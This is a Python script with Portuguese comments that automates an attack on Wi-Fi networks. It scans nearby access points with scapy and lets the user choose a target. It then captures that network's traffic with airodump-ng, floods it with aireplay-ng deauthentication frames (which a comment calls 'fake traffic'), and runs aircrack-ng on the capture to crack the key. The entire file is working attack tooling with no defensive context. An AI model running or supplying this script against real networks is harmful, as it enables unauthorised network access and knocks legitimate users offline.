from scapy.all import *
import os

# Função para listar as redes sem fio encontradas
def get_networks(packet):
    if packet.haslayer(Dot11Beacon):
        ssid = packet.getlayer(Dot11Elt).info.decode('utf-8')
        bssid = packet.getlayer(Dot11).addr2
        channel = int(ord(packet[Dot11Elt:3].info))
        network = (ssid, bssid, channel)
        if network not in networks:
            networks.append(network)
            print(len(networks), ssid, bssid, channel)

# Função para selecionar a rede alvo
def select_network():
    while True:
        try:
            choice = int(input("Selecione a rede alvo (1-{}): ".format(len(networks))))
            if choice in range(1, len(networks) + 1):
                ssid, bssid, channel = networks[choice - 1]
                return ssid, bssid, channel
        except ValueError:
            pass

# Configurações do aircrack-ng
FILENAME = 'captura'  # Nome do arquivo de captura
INTERFACE = 'wlan0mon'  # Nome da interface de rede sem fio

# Inicia o modo monitor
os.system('airmon-ng start wlan0')

# Escaneia as redes sem fio disponíveis
networks = []
sniff(iface=INTERFACE, prn=get_networks, timeout=10)

# Seleciona a rede alvo
ssid, bssid, channel = select_network()

# Inicia o airodump-ng em segundo plano para capturar o tráfego da rede sem fio
os.system('airodump-ng --bssid {} -c {} -w {} {} &'.format(bssid, channel, FILENAME, INTERFACE))

# Aguarda alguns segundos para garantir que o airodump-ng esteja capturando pacotes
time.sleep(10)

# Gera tráfego falso na rede sem fio
os.system('aireplay-ng -0 0 -a {} {} &'.format(bssid, INTERFACE))

# Aguarda mais alguns segundos para capturar mais pacotes
time.sleep(10)

# Interrompe o airodump-ng e o aireplay-ng
os.system('pkill airodump-ng')
os.system('pkill aireplay-ng')

# Analisa o arquivo de captura com o aircrack-ng
os.system('aircrack-ng {}.cap'.format(FILENAME))

# Finaliza o modo monitor
os.system('airmon-ng stop wlan0mon')
